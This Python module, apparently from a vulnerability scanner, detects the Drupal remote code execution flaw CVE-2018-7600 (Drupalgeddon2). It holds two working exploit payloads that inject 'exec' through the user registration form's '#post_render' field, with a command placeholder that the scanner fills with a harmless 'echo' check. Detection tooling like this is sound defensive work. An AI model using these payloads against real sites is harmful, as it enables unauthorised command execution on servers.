#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2018_7600_payloads = [
    {
        'path': 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
        'data': 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]={RCECOMMAND}'
    },
    {
        'path': 'register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
        'data': 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]={RCECOMMAND}'
    },
]

def cve_2018_7600_scan(self, clients):
    '''  '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2018-7600',
    }

    for payload in cve_2018_7600_payloads:
        random_str = random_md5(6)
        RCEcommand = 'echo ' + random_str
        
        path = payload['path']
        data = payload['data'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
